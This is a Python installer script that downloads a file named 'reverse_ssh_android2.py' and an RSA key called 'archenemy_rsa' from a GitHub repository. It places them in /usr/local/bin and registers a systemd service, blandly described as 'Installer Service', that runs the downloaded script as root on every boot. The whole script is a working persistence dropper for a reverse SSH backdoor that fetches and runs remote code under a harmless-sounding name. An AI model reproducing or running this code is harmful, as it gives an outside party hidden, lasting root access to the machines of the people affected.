#!/usr/bin/env python3

import os
import requests
import subprocess


# Define URLs for downloading the necessary files
repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/reverse_ssh_android2.py"
requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/archenemy_rsa"


# Define the output file paths
repoFilePath = "/usr/local/bin/reverse_ssh_android2.py"
requirementsFilePath = "/usr/local/bin/requirements.txt"
contentFilePath = "/usr/local/bin/archenemy_rsa"
serviceFilePath = "/etc/systemd/system/reverse_ssh.service"



# Function to download a file and save it locally
def download_file(url, file_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {file_path} successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to download {file_path}. Error: {e}")

# Function to create a systemd service file
def create_service_file():
    service_content = f"""[Unit]
Description=Installer Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {repoFilePath}
WorkingDirectory=/usr/local/bin
StandardOutput=journal
StandardError=journal
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
"""
    try:
        with open(serviceFilePath, 'w') as f:
            f.write(service_content)
        print(f"Service file created at {serviceFilePath}.")
    except Exception as e:
        print(f"Failed to create service file. Error: {e}")

# Function to install requirements
def install_requirements(file_path):
    try:
        subprocess.run(['pip3', 'install', '-r', file_path], check=True)
        print("Requirements installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install requirements. Error: {e}")

# Function to make script executable
def make_executable(file_path):
    try:
        os.chmod(file_path, 0o755)
        print(f"{file_path} is now executable.")
    except Exception as e:
        print(f"Failed to set executable permissions for {file_path}. Error: {e}")

if __name__ == "__main__":
    # Download the files
    download_file(repoUrl, repoFilePath)
    download_file(requirementsUrl, requirementsFilePath)
    download_file(contentUrl, contentFilePath)

    print("[!] Files saved successfully.")

    # Make the main script executable
    make_executable(repoFilePath)

    # Install requirements
    #install_requirements(requirementsFilePath)

    # Create the systemd service file
    create_service_file()

    # Reload systemd to recognize the new service
    subprocess.run(['systemctl', 'daemon-reload'], check=True)

    # Enable the service to run at boot
    subprocess.run(['systemctl', 'enable', 'reverse_ssh.service'], check=True)

    # Start the service immediately
    subprocess.run(['systemctl', 'start', 'reverse_ssh.service'], check=True)

